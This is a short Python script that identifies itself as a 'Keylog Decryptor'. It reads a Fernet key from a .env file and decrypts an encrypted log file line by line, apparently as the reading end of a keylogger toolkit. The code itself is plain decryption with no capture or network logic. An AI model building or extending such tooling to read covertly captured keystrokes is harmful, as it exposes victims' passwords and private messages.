import os
import sys
from dotenv import load_dotenv
from cryptography.fernet import Fernet

load_dotenv()
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY")

if not ENCRYPTION_KEY:
    print("[!] Error: No ENCRYPTION_KEY found in .env")
    sys.exit(1)

try:
    cipher_suite = Fernet(ENCRYPTION_KEY.encode())
except Exception as e:
    print(f"[!] Invalid Key Format: {e}")
    sys.exit(1)

def decrypt_file(filepath):
    if not os.path.exists(filepath):
        print(f"[!] File not found: {filepath}")
        return

    print(f"\n--- Decrypting {filepath} ---")
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            lines = f.readlines()
            
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            try:
                decrypted_bytes = cipher_suite.decrypt(line.encode('utf-8'))
                print(decrypted_bytes.decode('utf-8'))
            except Exception:
                print(f"[ERROR] Could not decrypt line: {line[:20]}...")
                
        print("-------------------------\n")
    except Exception as e:
        print(f"[!] File Read Failed: {e}")

if __name__ == "__main__":
    print("Welcome to the Keylog Decryptor (Local File Mode)")
    target_file = input("Enter log filename (default: encrypted_logs.txt): ")
    if not target_file:
        target_file = "encrypted_logs.txt"
        
    decrypt_file(target_file)
